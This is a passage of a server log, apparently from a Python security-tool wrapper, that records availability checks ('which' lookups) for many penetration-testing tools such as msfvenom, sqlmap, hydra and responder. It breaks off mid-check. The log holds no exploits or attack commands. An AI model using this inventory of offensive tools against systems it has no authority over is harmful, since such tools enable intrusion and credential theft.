2025-10-24 01:26:45,628 - __main__ - INFO - 🔍 Cache MISS for command: which aircrack-ng
2025-10-24 01:26:45,628 - __main__ - INFO - 🚀 EXECUTING: which aircrack-ng
2025-10-24 01:26:45,628 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,632 - __main__ - INFO - 🆔 PROCESS: PID 43493 started
2025-10-24 01:26:45,632 - __main__ - INFO - 🆔 REGISTERED: Process 43493 - which aircrack-ng...
2025-10-24 01:26:45,632 - __main__ - INFO - 📤 STDOUT: /usr/bin/aircrack-ng
2025-10-24 01:26:45,633 - __main__ - INFO - 🧹 CLEANUP: Process 43493 removed from registry
2025-10-24 01:26:45,633 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,633 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,633 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,633 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,633 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which aircrack-ng
2025-10-24 01:26:45,633 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,633 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 21 bytes
2025-10-24 01:26:45,633 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,633 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,633 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,633 - __main__ - INFO - 💾 Cached result for command: which aircrack-ng
2025-10-24 01:26:45,634 - __main__ - INFO - 🔍 Cache MISS for command: which msfvenom
2025-10-24 01:26:45,634 - __main__ - INFO - 🚀 EXECUTING: which msfvenom
2025-10-24 01:26:45,634 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,634 - __main__ - INFO - 🆔 PROCESS: PID 43498 started
2025-10-24 01:26:45,634 - __main__ - INFO - 🆔 REGISTERED: Process 43498 - which msfvenom...
2025-10-24 01:26:45,635 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43498
2025-10-24 01:26:45,637 - __main__ - INFO - 📤 STDOUT: /usr/bin/msfvenom
2025-10-24 01:26:45,637 - __main__ - INFO - 🧹 CLEANUP: Process 43498 removed from registry
2025-10-24 01:26:45,637 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,637 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,638 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,638 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,638 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which msfvenom
2025-10-24 01:26:45,638 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,638 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 01:26:45,638 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,638 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,638 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,638 - __main__ - INFO - 💾 Cached result for command: which msfvenom
2025-10-24 01:26:45,638 - __main__ - INFO - 💾 Cache HIT for command: which msfconsole
2025-10-24 01:26:45,638 - __main__ - INFO - 🔍 Cache MISS for command: which graphql-scanner
2025-10-24 01:26:45,638 - __main__ - INFO - 🚀 EXECUTING: which graphql-scanner
2025-10-24 01:26:45,638 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,638 - __main__ - INFO - 🆔 PROCESS: PID 43503 started
2025-10-24 01:26:45,638 - __main__ - INFO - 🆔 REGISTERED: Process 43503 - which graphql-scanner...
2025-10-24 01:26:45,639 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43503
2025-10-24 01:26:45,642 - __main__ - INFO - 🧹 CLEANUP: Process 43503 removed from registry
2025-10-24 01:26:45,643 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 01:26:45,643 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,643 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:45,643 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,643 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which graphql-scanner
2025-10-24 01:26:45,643 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,643 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:45,643 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:45,643 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:45,643 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,643 - __main__ - INFO - 🔍 Cache MISS for command: which jwt-analyzer
2025-10-24 01:26:45,643 - __main__ - INFO - 🚀 EXECUTING: which jwt-analyzer
2025-10-24 01:26:45,643 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,643 - __main__ - INFO - 🆔 PROCESS: PID 43508 started
2025-10-24 01:26:45,643 - __main__ - INFO - 🆔 REGISTERED: Process 43508 - which jwt-analyzer...
2025-10-24 01:26:45,644 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43508
2025-10-24 01:26:45,648 - __main__ - INFO - 🧹 CLEANUP: Process 43508 removed from registry
2025-10-24 01:26:45,648 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:45,648 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,648 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:45,648 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,648 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which jwt-analyzer
2025-10-24 01:26:45,648 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,648 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:45,648 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:45,648 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:45,648 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:46,672 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:26:46] "GET /health HTTP/1.1" 200 -
2025-10-24 01:26:49,458 - __main__ - INFO - 💾 Cache HIT for command: which nmap
2025-10-24 01:26:49,458 - __main__ - INFO - 💾 Cache HIT for command: which gobuster
2025-10-24 01:26:49,458 - __main__ - INFO - 💾 Cache HIT for command: which dirb
2025-10-24 01:26:49,458 - __main__ - INFO - 💾 Cache HIT for command: which nikto
2025-10-24 01:26:49,458 - __main__ - INFO - 💾 Cache HIT for command: which sqlmap
2025-10-24 01:26:49,458 - __main__ - INFO - 💾 Cache HIT for command: which hydra
2025-10-24 01:26:49,458 - __main__ - INFO - 💾 Cache HIT for command: which john
2025-10-24 01:26:49,458 - __main__ - INFO - 💾 Cache HIT for command: which hashcat
2025-10-24 01:26:49,458 - __main__ - INFO - 💾 Cache HIT for command: which rustscan
2025-10-24 01:26:49,458 - __main__ - INFO - 💾 Cache HIT for command: which masscan
2025-10-24 01:26:49,459 - __main__ - INFO - 💾 Cache HIT for command: which autorecon
2025-10-24 01:26:49,459 - __main__ - INFO - 💾 Cache HIT for command: which nbtscan
2025-10-24 01:26:49,459 - __main__ - INFO - 💾 Cache HIT for command: which arp-scan
2025-10-24 01:26:49,459 - __main__ - INFO - 💾 Cache HIT for command: which responder
2025-10-24 01:26:49,459 - __main__ - INFO - 💾 Cache HIT for command: which nxc
2025-10-24 01:26:49,459 - __main__ - INFO - 💾 Cache HIT for command: which enum4linux-ng
2025-10-24 01:26:49,459 - __main__ - INFO - 💾 Cache HIT for command: which rpcclient
2025-10-24 01:26:49,459 - __main__ - INFO - 💾 Cache HIT for command: which enum4linux
2025-10-24 01:26:49,459 - __main__ - INFO - 💾 Cache HIT for command: which ffuf
2025-10-24 01:26:49,459 - __main__ - INFO - 💾 Cache HIT for command: which feroxbuster
2025-10-24 01:26:49,459 - __main__ - INFO - 💾 Cache HIT for command: which dirsearch
2025-10-24 01:26:49,459 - __main__ - INFO - 💾 Cache HIT for command: which dotdotpwn
2025-10-24 01:26:49,459 - __main__ - INFO - 💾 Cache HIT for command: which xsser
2025-10-24 01:26:49,459 - __main__ - INFO - 💾 Cache HIT for command: which wfuzz
2025-10-24 01:26:49,459 - __main__ - INFO - 💾 Cache HIT for command: which gau
2025-10-24 01:26:49,459 - __main__ - INFO - 💾 Cache HIT for command: which waybackurls
2025-10-24 01:26:49,460 - __main__ - INFO - 💾 Cache HIT for command: which arjun
2025-10-24 01:26:49,460 - __main__ - INFO - 💾 Cache HIT for command: which paramspider
2025-10-24 01:26:49,460 - __main__ - INFO - 💾 Cache HIT for command: which x8
2025-10-24 01:26:49,460 - __main__ - INFO - 💾 Cache HIT for command: which jaeles
2025-10-24 01:26:49,460 - __main__ - INFO - 💾 Cache HIT for command: which dalfox
2025-10-24 01:26:49,460 - __main__ - INFO - 💾 Cache HIT for command: which httpx
2025-10-24 01:26:49,460 - __main__ - INFO - 💾 Cache HIT for command: which wafw00f
2025-10-24 01:26:49,460 - __main__ - INFO - 💾 Cache HIT for command: which burpsuite
2025-10-24 01:26:49,460 - __main__ - INFO - 💾 Cache HIT for command: which zaproxy
2025-10-24 01:26:49,460 - __main__ - INFO - 💾 Cache HIT for command: which katana
2025-10-24 01:26:49,460 - __main__ - INFO - 💾 Cache HIT for command: which hakrawler
2025-10-24 01:26:49,460 - __main__ - INFO - 💾 Cache HIT for command: which nuclei
2025-10-24 01:26:49,460 - __main__ - INFO - 💾 Cache HIT for command: which wpscan
2025-10-24 01:26:49,460 - __main__ - INFO - 🔍 Cache MISS for command: which graphql-scanner
2025-10-24 01:26:49,460 - __main__ - INFO - 🚀 EXECUTING: which graphql-scanner
2025-10-24 01:26:49,460 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:49,460 - __main__ - INFO - 🆔 PROCESS: PID 43527 started
2025-10-24 01:26:49,460 - __main__ - INFO - 🆔 REGISTERED: Process 43527 - which graphql-scanner...
2025-10-24 01:26:49,461 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43527
2025-10-24 01:26:49,465 - __main__ - INFO - 🧹 CLEANUP: Process 43527 removed from registry
2025-10-24 01:26:49,465 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:49,465 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:49,465 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:49,465 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:49,465 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which graphql-scanner
2025-10-24 01:26:49,465 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:49,465 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:49,465 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:49,465 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:49,465 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:49,465 - __main__ - INFO - 🔍 Cache MISS for command: which jwt-analyzer
2025-10-24 01:26:49,466 - __main__ - INFO - 🚀 EXECUTING: which jwt-analyzer
2025-10-24 01:26:49,466 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:49,466 - __main__ - INFO - 🆔 PROCESS: PID 43532 started
2025-10-24 01:26:49,466 - __main__ - INFO - 🆔 REGISTERED: Process 43532 - which jwt-analyzer...
2025-10-24 01:26:49,466 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43532
2025-10-24 01:26:49,471 - __main__ - INFO - 🧹 CLEANUP: Process 43532 removed from registry
2025-10-24 01:26:49,471 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:49,471 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:49,471 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:49,471 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:49,471 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which jwt-analyzer
2025-10-24 01:26:49,471 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:49,471 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:49,471 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:49,471 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:49,471 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:49,471 - __main__ - INFO - 💾 Cache HIT for command: which medusa
2025-10-24 01:26:49,471 - __main__ - INFO - 💾 Cache HIT for command: which patator
2025-10-24 01:26:49,471 - __main__ - INFO - 💾 Cache HIT for command: which hash-identifier
2025-10-24 01:26:49,471 - __main__ - INFO - 💾 Cache HIT for command: which ophcrack
2025-10-24 01:26:49,471 - __main__ - INFO - 💾 Cache HIT for command: which gdb
2025-10-24 01:26:49,471 - __main__ - INFO - 💾 Cache HIT for command: which radare2
2025-10-24 01:26:49,471 - __main__ - INFO - 💾 Cache HIT for command: which binwalk
2025-10-24 01:26:49,471 - __main__ - INFO - 💾 Cache HIT for command: which ropgadget
2025-10-24 01:26:49,471 - __main__ - INFO - 💾 Cache HIT for command: which checksec
2025-10-24 01:26:49,471 - __main__ - INFO - 💾 Cache HIT for command: which objdump
2025-10-24 01:26:49,471 - __main__ - INFO - 💾 Cache HIT for command: which ghidra
2025-10-24 01:26:49,471 - __main__ - INFO - 💾 Cache HIT for command: which ropper
2025-10-24 01:26:49,471 - __main__ - INFO - 💾 Cache HIT for command: which angr
2025-10-24 01:26:49,471 - __main__ - INFO - 🔍 Cache MISS for command: which libc-database
2025-10-24 01:26:49,471 - __main__ - INFO - 🚀 EXECUTING: which libc-database
2025-10-24 01:26:49,471 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:49,472 - __main__ - INFO - 🆔 PROCESS: PID 43537 started
2025-10-24 01:26:49,472 - __main__ - INFO - 🆔 REGISTERED: Process 43537 - which libc-database...
2025-10-24 01:26:49,472 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43537
2025-10-24 01:26:49,477 - __main__ - INFO - 🧹 CLEANUP: Process 43537 removed from registry
2025-10-24 01:26:49,477 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:49,477 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:49,477 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:49,477 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:49,477 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which libc-database
2025-10-24 01:26:49,477 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:49,477 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:49,477 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:49,477 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:49,477 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:49,477 - __main__ - INFO - 💾 Cache HIT for command: which pwninit
2025-10-24 01:26:49,478 - __main__ - INFO - 💾 Cache HIT for command: which steghide
2025-10-24 01:26:49,478 - __main__ - INFO - 🔍 Cache MISS for command: which hashpump
2025-10-24 01:26:49,478 - __main__ - INFO - 🚀 EXECUTING: which hashpump
2025-10-24 01:26:49,478 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:49,478 - __main__ - INFO - 🆔 PROCESS: PID 43542 started
2025-10-24 01:26:49,478 - __main__ - INFO - 🆔 REGISTERED: Process 43542 - which hashpump...
2025-10-24 01:26:49,479 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43542
2025-10-24 01:26:49,483 - __main__ - INFO - 🧹 CLEANUP: Process 43542 removed from registry
2025-10-24 01:26:49,483 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:49,483 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:49,483 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:49,483 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:49,483 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which hashpump
2025-10-24 01:26:49,483 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:49,483 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:49,483 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:49,483 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:49,483 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:49,483 - __main__ - INFO - 💾 Cache HIT for command: which foremost
2025-10-24 01:26:49,483 - __main__ - INFO - 💾 Cache HIT for command: which exiftool
2025-10-24 01:26:49,483 - __main__ - INFO - 💾 Cache HIT for command: which strings
2025-10-24 01:26:49,483 - __main__ - INFO - 💾 Cache HIT for command: which xxd
2025-10-24 01:26:49,483 - __main__ - INFO - 💾 Cache HIT for command: which file
2025-10-24 01:26:49,483 - __main__ - INFO - 💾 Cache HIT for command: which photorec
2025-10-24 01:26:49,483 - __main__ - INFO - 💾 Cache HIT for command: which testdisk
2025-10-24 01:26:49,483 - __main__ - INFO - 💾 Cache HIT for command: which scalpel
2025-10-24 01:26:49,483 - __main__ - INFO - 💾 Cache HIT for command: which zsteg
2025-10-24 01:26:49,483 - __main__ - INFO - 💾 Cache HIT for command: which outguess
2025-10-24 01:26:49,483 - __main__ - INFO - 💾 Cache HIT for command: which trivy
2025-10-24 01:26:49,483 - __main__ - INFO - 💾 Cache HIT for command: which kube-bench
2025-10-24 01:26:49,483 - __main__ - INFO - 💾 Cache HIT for command: which checkov
2025-10-24 01:26:49,483 - __main__ - INFO - 💾 Cache HIT for command: which terrascan
2025-10-24 01:26:49,483 - __main__ - INFO - 💾 Cache HIT for command: which falco
2025-10-24 01:26:49,483 - __main__ - INFO - 🔍 Cache MISS for command: which clair
2025-10-24 01:26:49,484 - __main__ - INFO - 🚀 EXECUTING: which clair
2025-10-24 01:26:49,484 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:49,484 - __main__ - INFO - 🆔 PROCESS: PID 43547 started
2025-10-24 01:26:49,484 - __main__ - INFO - 🆔 REGISTERED: Process 43547 - which clair...
2025-10-24 01:26:49,485 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43547
2025-10-24 01:26:49,490 - __main__ - INFO - 🧹 CLEANUP: Process 43547 removed from registry
2025-10-24 01:26:49,490 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:49,490 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:49,490 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:49,490 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:49,490 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which clair
2025-10-24 01:26:49,490 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:49,490 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:49,490 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:49,490 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:49,490 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:49,490 - __main__ - INFO - 💾 Cache HIT for command: which amass
2025-10-24 01:26:49,490 - __main__ - INFO - 💾 Cache HIT for command: which subfinder
2025-10-24 01:26:49,490 - __main__ - INFO - 💾 Cache HIT for command: which fierce
2025-10-24 01:26:49,490 - __main__ - INFO - 💾 Cache HIT for command: which dnsenum
2025-10-24 01:26:49,490 - __main__ - INFO - 💾 Cache HIT for command: which theharvester
2025-10-24 01:26:49,490 - __main__ - INFO - 💾 Cache HIT for command: which sherlock
2025-10-24 01:26:49,490 - __main__ - INFO - 🔍 Cache MISS for command: which social-analyzer
2025-10-24 01:26:49,490 - __main__ - INFO - 🚀 EXECUTING: which social-analyzer
2025-10-24 01:26:49,490 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:49,490 - __main__ - INFO - 🆔 PROCESS: PID 43552 started
2025-10-24 01:26:49,490 - __main__ - INFO - 🆔 REGISTERED: Process 43552 - which social-analyzer...
2025-10-24 01:26:49,491 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43552
2025-10-24 01:26:49,496 - __main__ - INFO - 🧹 CLEANUP: Process 43552 removed from registry
2025-10-24 01:26:49,496 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:49,496 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:49,496 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:49,496 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:49,496 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which social-analyzer
2025-10-24 01:26:49,496 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:49,496 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:49,496 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:49,496 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:49,496 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:49,496 - __main__ - INFO - 💾 Cache HIT for command: which recon-ng
2025-10-24 01:26:49,497 - __main__ - INFO - 💾 Cache HIT for command: which maltego
2025-10-24 01:26:49,497 - __main__ - INFO - 💾 Cache HIT for command: which spiderfoot
2025-10-24 01:26:49,497 - __main__ - INFO - 💾 Cache HIT for command: which shodancli
2025-10-24 01:26:49,497 - __main__ - INFO - 🔍 Cache MISS for command: which censys-cli
2025-10-24 01:26:49,497 - __main__ - INFO - 🚀 EXECUTING: which censys-cli
2025-10-24 01:26:49,497 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:49,497 - __main__ - INFO - 🆔 PROCESS: PID 43557 started
2025-10-24 01:26:49,497 - __main__ - INFO - 🆔 REGISTERED: Process 43557 - which censys-cli...
2025-10-24 01:26:49,497 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43557
2025-10-24 01:26:49,501 - __main__ - INFO - 🧹 CLEANUP: Process 43557 removed from registry
2025-10-24 01:26:49,501 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 01:26:49,501 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:49,501 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:49,501 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:49,501 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which censys-cli
2025-10-24 01:26:49,501 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:49,502 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:49,502 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:49,502 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:49,502 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:49,502 - __main__ - INFO - 🔍 Cache MISS for command: which have-i-been-pwned
2025-10-24 01:26:49,502 - __main__ - INFO - 🚀 EXECUTING: which have-i-been-pwned
2025-10-24 01:26:49,502 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:49,502 - __main__ - INFO - 🆔 PROCESS: PID 43562 started
2025-10-24 01:26:49,502 - __main__ - INFO - 🆔 REGISTERED: Process 43562 - which have-i-been-pwned...
